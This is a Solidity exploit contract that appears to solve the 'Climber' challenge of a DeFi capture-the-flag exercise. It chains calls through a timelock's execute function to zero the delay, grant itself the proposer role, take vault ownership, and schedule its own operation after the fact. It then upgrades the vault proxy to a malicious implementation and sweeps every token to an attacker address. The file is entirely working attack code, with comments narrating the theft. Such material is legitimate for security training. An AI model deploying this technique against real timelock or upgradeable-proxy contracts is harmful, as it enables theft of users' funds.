pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "./UpgradedVaultAttack.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

contract ClimberAttack{

    ClimberTimelock timelock;
    ClimberVault vault;
    UpgradedVaultAttack upgradedVault;
    IERC20 token;
    address attacker;
    constructor(
        ClimberTimelock timelock_, 
        ClimberVault vault_,
        UpgradedVaultAttack upgradedVault_, 
        IERC20 token_, 
        address attacker_
    ){
        timelock = timelock_;
        upgradedVault = upgradedVault_;
        vault = vault_;
        attacker = attacker_;
        token = token_;
    }

    address[] targets;
    uint256[]  values;
    bytes[] data;
    function attack() public{
        //First we make the timelock delay to 0!
        targets.push(address(timelock));
        values.push(0);
        data.push(abi.encodeWithSelector(
            ClimberTimelock.updateDelay.selector, uint64(0)));

        //Next make this contract a proposer
        targets.push(address(timelock));
        values.push(0);
        data.push(abi.encodeWithSelector(
            AccessControl.grantRole.selector, 
            keccak256("PROPOSER_ROLE"),
            address(this)));

        //third, transfer ownership of the timelock to this contract
        targets.push(address(vault));
        values.push(0);
        data.push(abi.encodeWithSelector(
            OwnableUpgradeable.transferOwnership.selector, 
            address(this)));

        // finally call the scheduleOperation method on this contract which will schedule the operation on the timelock
        targets.push(address(this));
        values.push(0);
        data.push(abi.encodeWithSelector(
            this.scheduleAndStealTokens.selector));

        //now execute all the function calls we just defined abovee
        timelock.execute(targets, values, data, "");
    }

    function scheduleAndStealTokens() public{
        //schedule the operation on the timelock
        timelock.schedule(targets, values, data, "");

        //now let's upgrade the contract! 
        // function upgradeTo(address newImplementation) external virtual onlyProxy {
        vault.upgradeTo(address(upgradedVault));

        //now sweep the tokens to the attacker
        UpgradedVaultAttack(address(vault)).sweepTokens(token, attacker);
        // upgradedVault.sweepTokens(token, attacker);

    }
}